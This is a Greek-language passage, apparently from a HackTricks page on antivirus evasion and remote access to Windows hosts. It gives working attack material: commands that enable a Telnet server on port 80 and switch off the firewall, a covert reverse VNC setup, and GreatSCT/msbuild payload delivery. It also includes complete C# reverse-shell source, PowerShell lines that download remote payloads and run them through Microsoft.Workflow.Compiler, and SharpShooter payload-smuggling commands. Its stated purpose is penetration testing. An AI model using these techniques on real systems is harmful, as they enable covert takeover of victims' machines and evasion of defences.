Ένα άλλο εργαλείο που κάνει το **ίδιο πράγμα είναι** [**avred**](https://github.com/dobin/avred) με μια ανοιχτή ιστοσελίδα που προσφέρει την υπηρεσία στο [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Μέχρι τα Windows 10, όλα τα Windows έρχονταν με έναν **Telnet server** που μπορούσατε να εγκαταστήσετε (ως διαχειριστής) κάνοντας:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Κάντε το **να ξεκινά** όταν εκκινείται το σύστημα και **τρέξτε** το τώρα:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Αλλαγή θύρας telnet** (stealth) και απενεργοποίηση του τείχους προστασίας:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Κατεβάστε το από: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (θέλετε τις bin λήψεις, όχι την εγκατάσταση)

**ΣΤΟΝ HOST**: Εκτελέστε το _**winvnc.exe**_ και ρυθμίστε τον διακομιστή:

- Ενεργοποιήστε την επιλογή _Disable TrayIcon_
- Ορίστε έναν κωδικό πρόσβασης στο _VNC Password_
- Ορίστε έναν κωδικό πρόσβασης στο _View-Only Password_

Στη συνέχεια, μεταφέρετε το δυαδικό _**winvnc.exe**_ και το **νέο** αρχείο _**UltraVNC.ini**_ μέσα στον **θύμα**

#### **Αντίστροφη σύνδεση**

Ο **επιτιθέμενος** θα πρέπει να **εκτελέσει μέσα** στον **host** του το δυαδικό `vncviewer.exe -listen 5900` ώστε να είναι **έτοιμος** να πιάσει μια αντίστροφη **VNC σύνδεση**. Στη συνέχεια, μέσα στον **θύμα**: Ξεκινήστε τον δαίμονα winvnc `winvnc.exe -run` και εκτελέστε `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ΠΡΟΕΙΔΟΠΟΙΗΣΗ:** Για να διατηρήσετε την κρυψίνοια δεν πρέπει να κάνετε μερικά πράγματα

- Μην ξεκινήσετε το `winvnc` αν είναι ήδη σε εκτέλεση ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/1SROTTl.png). ελέγξτε αν είναι σε εκτέλεση με `tasklist | findstr winvnc`
- Μην ξεκινήσετε το `winvnc` χωρίς το `UltraVNC.ini` στον ίδιο φάκελο ή θα προκαλέσει το [παράθυρο ρύθμισης](https://i.imgur.com/rfMQWcf.png) να ανοίξει
- Μην εκτελέσετε το `winvnc -h` για βοήθεια ή θα ενεργοποιήσετε ένα [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Κατεβάστε το από: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Μέσα στο GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Τώρα **ξεκινήστε τον καταχωρητή** με `msfconsole -r file.rc` και **εκτελέστε** το **xml payload** με:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Ο τρέχων αμυντικός θα τερματίσει τη διαδικασία πολύ γρήγορα.**

### Συγκέντρωση του δικού μας reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Πρώτο C# Revershell

Συγκεντρώστε το με:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Χρησιμοποιήστε το με:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# χρησιμοποιώντας μεταγλωττιστή
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
Αυτόματη λήψη και εκτέλεση:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Λίστα αποσυμπιεστών C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Χρησιμοποιώντας python για παράδειγμα κατασκευής ενέσεων:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Άλλα εργαλεία
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Περισσότερα

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)


{{#include ../banners/hacktricks-training.md}}
